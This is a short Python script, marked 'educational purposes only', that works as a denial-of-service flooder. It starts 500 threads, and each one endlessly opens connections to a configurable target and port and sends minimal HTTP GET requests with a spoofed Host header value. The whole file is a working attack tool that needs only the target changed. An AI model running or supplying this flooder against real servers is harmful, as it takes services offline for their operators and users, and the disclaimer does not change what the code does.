"""
EDUCATIONAL PURPOSES ONLY
"""

import threading 
import socket

TARGET = 'localhost'
PORT = 80                  # find open ports with  port scanner
FAKE_IP = '182.21.20.32'    # example IP, does not hide you


def attack():
    while True:
        # loops sending, connecting and closing 
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((TARGET, PORT))
            sock.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
            sock.sendto(("Host: " + FAKE_IP + "\r\n\r\n").encode('ascii'), (TARGET, PORT))
            sock.close()
        except Exception as e:
            print(e)
            #attack()


# 500 threads will run attack()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    